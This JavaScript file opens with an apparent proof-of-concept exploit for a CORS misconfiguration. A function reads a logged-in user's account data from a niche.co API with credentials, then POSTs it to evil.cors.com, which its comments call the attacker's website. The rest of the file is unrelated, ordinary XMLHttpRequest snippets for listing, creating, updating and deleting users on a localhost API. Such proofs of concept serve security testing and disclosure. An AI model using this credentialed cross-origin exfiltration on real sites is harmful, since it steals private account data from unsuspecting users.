function cors() 
{
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () 
    {
        if (this.readyState == 4 && this.status == 200) 
        {
            var a = this.responseText; // Sensitive data from niche.co about user account
            document.getElementById("demo").innerHTML = a;
            xhttp.open("POST", "http://evil.cors.com", true); // Sending that data to Attacker's website
            xhttp.withCredentials = true;
            console.log(a);
            xhttp.send("data=" + a);
        }
    };
    xhttp.open("GET", "https://www.niche.co/api/v1/users/*******", true);
    xhttp.withCredentials = true;
    xhttp.send();
}

#############################################################################
// Get all users
var url  = "http://localhost:8080/api/v1/users";
var xhr  = new XMLHttpRequest()
xhr.open('GET', url, true)
xhr.onload = function () {
	var users = JSON.parse(xhr.responseText);
	if (xhr.readyState == 4 && xhr.status == "200") {
		console.table(users);
	} else {
		console.error(users);
	}
}
xhr.send(null);

// Get a user
var url  = "http://localhost:8080/api/v1/users";
var xhr  = new XMLHttpRequest()
xhr.open('GET', url+'/1', true)
xhr.onload = function () {
	var users = JSON.parse(xhr.responseText);
	if (xhr.readyState == 4 && xhr.status == "200") {
		console.table(users);
	} else {
		console.error(users);
	}
}
xhr.send(null);


// Post a user
var url = "http://localhost:8080/api/v1/users";

var data = {};
data.firstname = "John";
data.lastname  = "Snow";
var json = JSON.stringify(data);

var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
xhr.setRequestHeader('Content-type','application/json; charset=utf-8');
xhr.onload = function () {
	var users = JSON.parse(xhr.responseText);
	if (xhr.readyState == 4 && xhr.status == "201") {
		console.table(users);
	} else {
		console.error(users);
	}
}
xhr.send(json);


// Update a user
var url = "http://localhost:8080/api/v1/users";

var data = {};
data.firstname = "John2";
data.lastname  = "Snow2";
var json = JSON.stringify(data);

var xhr = new XMLHttpRequest();
xhr.open("PUT", url+'/12', true);
xhr.setRequestHeader('Content-type','application/json; charset=utf-8');
xhr.onload = function () {
	var users = JSON.parse(xhr.responseText);
	if (xhr.readyState == 4 && xhr.status == "200") {
		console.table(users);
	} else {
		console.error(users);
	}
}
xhr.send(json);


// Delete a user
var url = "http://localhost:8080/api/v1/users";
var xhr = new XMLHttpRequest();
xhr.open("DELETE", url+'/12', true);
xhr.onload = function () {
	var users = JSON.parse(xhr.responseText);
	if (xhr.readyState == 4 && xhr.status == "200") {
		console.table(users);
	} else {
		console.error(users);
	}
}
xhr.send(null);
